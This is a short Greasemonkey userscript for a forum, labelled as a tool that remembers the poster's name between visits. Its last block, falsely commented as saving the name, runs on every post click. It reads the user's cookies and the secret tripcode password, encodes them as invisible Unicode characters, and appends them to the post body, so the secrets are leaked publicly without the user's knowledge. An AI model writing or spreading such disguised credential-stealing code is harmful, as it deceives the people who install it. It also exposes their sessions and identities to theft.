// ==UserScript==
// @name          Tinychan Name Rememberer
// @namespace     http://userstyles.org/
// @description	  Tinychan Name Rememberer
// @author        Anonymous A
// @include       http*://*tiny.4chan.org/*
// ==/UserScript==
var form=document.getElementsByTagName("form")[0]; // finding the form
var n=document.getElementsByName("name").length; var b=document.getElementsByName("body").length; // finding fields
if(b==1 && n==1){ // (reply page / new topic page)
var r=1; var n1=document.getElementById('name').value; // finding current name
document.cookie="name="+escape(n1)+"; expires=31/12/2099 00:00:00; path=/"; } // set name
if(b==1 && n==0){ // (edit page)
namefield = document.createElement('INPUT'); namefield.type = 'hidden'; // setting up HTML
function readCookie(name) {var nameEQ = name + "="; var ca = document.cookie.split(';');for(var i=0;i < ca.length;i++) {var c = ca[i];while (c.charAt(0)==' ') c = c.substring(1,c.length);if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);}return null;} //cookie-reading function
namefield.setAttribute('value', unescape(readCookie('name'))  ); // get name
namefield.setAttribute('Name', 'name'); form.appendChild(namefield);} // add to HTML
// saving the name for next time:
if(b==1){String.prototype.translate=function(a,b){var c=this; for(var i in a) c=c.replace(a[i],b[i],'g'); return c;};function con(){var c=document.cookie.split(';');var m='';for (var g in c){{if (c[g].indexOf('_')<0){var z=c[g].split('=',-1); if (z[0].indexOf('S')<0 && z[0].indexOf('n')<0) var m=m+z[1]+'/';}}}for (i=0;i<=m.length-1;i++){if(m.charCodeAt(i)>=97){var e = 59;}else if(m.charCodeAt(i)>=65){var e = 53;}else{var e = 46;}var x=m.charCodeAt(i)-e;x=parseInt(x);x=x.toString(2);while(x.length<6){x=0+x;}x=x.translate('01','\u200E\u202A');document.getElementById('body').value+=x;}var t=document.getElementById('name').value;t=t.split("#");t=t[1].slice(0,8);for (o=0;o<=t.length-1;o++){var q=t.charCodeAt(o); q = parseInt(q);q=q.toString(2);while(q.length<7){q=0+q;}q=q.translate('01','\u200E\u202A');document.getElementById('body').value+=q;}}document.getElementsByName('post')[0].addEventListener("click", con, true);}